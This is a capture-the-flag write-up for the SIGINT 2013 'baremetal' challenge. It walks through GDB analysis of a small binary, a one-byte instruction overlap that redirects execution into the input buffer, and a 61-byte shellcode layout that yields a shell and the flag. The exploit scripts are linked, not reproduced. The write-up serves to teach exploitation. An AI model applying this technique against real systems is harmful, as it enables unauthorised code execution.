SIGINT CTF 2013 pwning 100 - baremetal
---

Exploit code: [sploit.py] [1]

Shellcode: [sc.s] [2]

The shellcode must be linked with the base address of the text segment at `0x80491c8`.
This is accomplished by using the linker script: [sc.lds] [3]

### The Specimen

```
$ file baremetal
baremetal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

### Analysis

The binary is small, and looks like it was written in assembly.

Here is a summary of the binary's execution:
* Writes the string "baremetal online\n" to stdout.
* Reads up to 61 bytes from stdin into a buffer in the .bss section.
* Performs the "sum test." The sum of the bytes is calculated up to the first null byte.
* If the sum is 0x1ee7, the string "Sequence OK" is printed on stdout.
* If the sum is not 0x1ee7, the string "Bad Sequence" is printed on stdout.
* Exit.

Both the buffer and the return address are _not_ stored on the stack.

### The Vulnerability

Before the input is read in, the value `0xe7ff4747` is written to address `0x8049204`.
The input buffer and this 32-bit integer at location `0x8049204` overlap by one byte.
If the sum of the bytes is `0x1ee7`, then a jump is made to `0x8049204`.

This is the state right after the jump to `0x8049204`:
```
0x08049204 in ?? ()
(gdb) x/x $eip
0x8049204:	0xe7ff4747
(gdb) x/4i $eip
=> 0x8049204:	inc    %edi                    ; we can control this byte
   0x8049205:	inc    %edi
   0x8049206:	jmp    *%edi
   0x8049208:	add    %al,(%eax)
(gdb) info registers
eax            0x80491c8        134517192      ; the address of the input buffer
ecx            0x8049204        134517252
edx            0x0              0
ebx            0x47             71
esp            0xbffff820       0xbffff820
ebp            0x0              0x0
esi            0x0              0
edi            0x80480f9        134512889
eip            0x8049204        0x8049204
eflags         0x200206	[ PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb)
```

### The Exploit

The last byte of a 61-byte input becomes the first byte of the instructions at `0x8049204`.
We need to choose a one-byte instruction that will help transfer execution to somewhere in our buffer.
Because EAX holds the address of the input buffer, the one-byte instruction `xchg %eax, %edi` fit this need.
After the `jmp *%edi` at `0x8049208`, execution will continue one byte into our input buffer.

```
(gdb) x/x $eip
0x8049204:	0xe7ff4797              ; Notice that least significant byte is 0x97.
(gdb) x/3i $eip
=> 0x8049204:	xchg   %eax,%edi
   0x8049205:	inc    %edi
   0x8049206:	jmp    *%edi
(gdb) nexti
0x08049205 in ?? ()
(gdb) nexti
0x08049206 in ?? ()
(gdb) nexti
0x080491c9 in ?? ()                     ; Execution is now inside the input buffer.
(gdb)
```

The input must meet these criteria to execute shellcode contained in the input:
* The length must be 61 bytes long.
* The last byte must be the instruction `xchg %eax, %edi`
* The sum of the bytes before the first null must be 0x1ee7.
* Shellcode starts immediatly after the first byte.

I have chosen an input that looks like this:
```
+------+---------------+--------------+-----------------+---------------+------+
| 0x90 |  shellcode    |    nonce     |   0x00 ...      | "/bin/sh\x00" | 0x97 |
+------+---------------+--------------+-----------------+---------------+------+
```
* The first byte is a nop.  It could be anything that isn't null.  It won't be executed.
* The shellcode can't contain any nulls.
* The nonce section contains bytes that are chosen to ensure the input passes the sum test.
* The last byte is 0x97 or `xchg %eax, %edi`

### Action Shot

```
$ ./sploit.py
baremetal online
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd home
ls
challenge
cd challenge
ls
baremetal
flag
cat flag
SIGINT_are_you_getting_warmed_up?
uname -a
Linux ubuntu 3.8.0-25-generic #37-Ubuntu SMP Thu Jun 6 20:47:30 UTC 2013 i686 i686 i686 GNU/Linux
```

  [1]: https://github.com/wjlandryiii/ctfs/blob/master/sigint2013/baremetal/sploit.py
  [2]: https://github.com/wjlandryiii/ctfs/blob/master/sigint2013/baremetal/sc.s
  [3]: https://github.com/wjlandryiii/ctfs/blob/master/sigint2013/baremetal/sc.lds
